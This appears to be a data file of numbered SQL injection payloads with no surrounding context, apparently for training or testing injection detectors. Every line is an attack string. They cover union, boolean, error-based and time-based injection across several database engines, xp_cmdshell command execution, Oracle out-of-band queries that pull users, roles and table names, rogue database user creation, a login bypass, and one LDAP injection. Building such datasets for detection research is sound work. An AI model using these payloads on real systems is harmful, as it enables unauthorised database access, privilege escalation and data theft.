1 -8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793# 
10 t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
16 -9031%"  )   order by 1-- 
24 -2378" where 2686  =  2686 or 6872  =  6872-- 
25 -4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059-- 
26 -8448%" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and "%"  =  " 
27 iif  (  1878  =  2513,1,1/0  )   
29 end and    (    (   2160  =  2160 
50 -9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa 
61  or 'something'   =   'some'+'thing' 
67 -1256' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889-- 
83 -4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# 
86 -9891" union all select 7489# 
97 -9356 or elt  (  1032  =  1032,3623  )  -- izgi 
104 -7242' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'kfff'  =  'kfff 
106 -1447" union all select 3013,3013,3013,3013,3013,3013,3013-- 
113 -2071 union all select 4753,4753-- 
133  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i 
136 -7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891# 
143 -5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153# 
171  or userid like '% 
178 -3867%'  )   or 3084  =  5633 and   (  '%'  =  ' 
182 -- &password  =  
192 -4955%' union all select 5928,5928-- 
203  (  8266  =  8266  )  *9900 
205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
211  end and "%"  =  " 
220 *| 
223 -4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285# 
275 declare @s varchar  (  22  )   select @s   =  
284 -1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  -- 
297 -2453"  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520-- 
310  end and    (    (     (  "memh" like "memh 
314 -8639  )   or 8138  =  6252 
319 -7416" where 7656  =  7656 order by 1-- 
322 if  (  3392  =  4422  )   select 3392 else drop function xsqq-- 
324 -5520%" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235-- 
328 -3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741# 
332 -9393' where 3119  =  3119 or 8571  =  8571-- 
338 -8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049# 
343 -5020%'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ' 
361 iif  (  3760  =  4785,1,1/0  )   
365 -5386'  )   union all select 8026,8026,8026,8026,8026,8026# 
366 -4165" where 1772  =  1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772-- 
382  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i 
388 -4494 or 5291  =  4452 
395 -1638' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'xkne'  =  'xkne 
409 iif  (  1157  =  4542,1,1/0  )   
416 -9509'  )   where 9303  =  9303 order by 1# 
423 iif  (  8354  =  3515,1,1/0  )   
426 insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )    
432 %2A%28%7C%28objectclass%3D%2A%29%29 
433 -2448%"  )   or 3038  =  3038 
446 -1621' in boolean mode  )   order by 1-- 
449 -8673"  )   or make_set  (  9354  =  9354,7185  )   and   (  "edap" like "edap 
453 -4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986# 
466 -2569' union all select 4484-- 
478 -4191  )   order by 1# 
495 -3088' or 6872  =  6872 and 'miwk'  =  'miwk 
499 or 'something'   =   'some'+'thing' 
503 -8633" or 5099  =  5974 
504 -5803  )   where 8651  =  8651 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- 
505 -8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492# 
508  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i 
513 -2211" or 2113  =  8885# 
517 -5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- 
520 -9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202-- 
534 -6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839-- 
543 -1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415# 
555 create user name identified by 'pass123' 
568 -6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271# 
575 if  (  4735  =  8907  )   select 4735 else drop function qigo-- 
586 -5425 where 5933  =  5933 union all select 5933,5933,5933-- 
589 -3250%" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162-- 
592 -4406%' union all select 9599,9599,9599,9599# 
601 -4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415# 
605  (  7098  =  7098 and sleep  (  5   )    )  
608 -7006' where 6966  =  6966 union all select 6966,6966,6966,6966# 
617 -3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420# 
621 -4045 union all select 6857,6857,6857,6857,6857,6857,6857-- 
635 -8881%' union all select 8420,8420,8420,8420,8420,8420,8420# 
646 if  (  8284  =  6171  )   select 8284 else drop function mbih-- 
649 -7901  )   order by 1-- 
667 -4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc 
668 -2658  )   as casi where 7364  =  7364 or 8245  =  9651-- 
670 -1272' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  # 
687 -5798" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   
690 -3420 where 9681  =  9681 or make_set  (  2438  =  1977,1977  )  -- 
692 -2298%' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  # 
701 -9841 where 4612  =  4612 union all select 4612-- 
702 -9434"  )   as cqlw where 1600  =  1600 or 2733  =  1047-- 
710 ns 
720  end and    (    (   "dmgj"  =  "dmgj 
754 -2120'  )   or 8734  =  8844# 
758 \x27UNION SELECT 
789 iif  (  7011  =  2522,1,1/0  )   
797 declare @s varchar  (  200  )   select @s   =   0x77616974 ... 
822 iif  (  4460  =  1610,1,1/0  )   
831 -6731" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166-- 
858 iif  (  4638  =  8258,1,1/0  )   
868 -9958"  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741# 
880 -9739' or 8571  =  8571-- 
885 iif  (  5257  =  5257,1,1/0  )   
890 -7395%" order by 1-- 
892 -1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896-- 
895 -8521'+  (  select ucim where 9003  =  9003 union all select 9003-- 
898 -2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  ' 
908 -5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- 
935  or uname like '% 
944 -9358' or 9887  =  2569-- 
959 -8868"  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- 
974 -7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089-- 
983 -9864"  )   or elt  (  5885  =  4936,4936  )   and   (  "bfbb" like "bfbb 
984 make_set  (  5679  =  9769,9769  )   
1002 -3107'  )   where 7782  =  7782 or 8571  =  8571-- 
1011 -3321" where 1603  =  1603 union all select 1603,1603,1603,1603# 
1012 if  (  8995  =  9787  )   select 8995 else drop function ofgg-- 
1017 -9037%" union all select 6583# 
1022 elt  (  2567  =  9921,9921  )   
1051 -9535" order by 1-- 
1069 -5147 or   (  8459  =  8459  )  *4906 
1085 -8086%'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ' 
1087 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  )  
1088 -7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo 
1094 ^' 
1101 -7466 where 5161  =  5161 or 3038  =  3038 
1117 -5963" or 9323  =  9323# 
1123 -1602' or 3038  =  3038 
1135 -8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974# 
1143 iif  (  1217  =  8831,1,1/0  )   
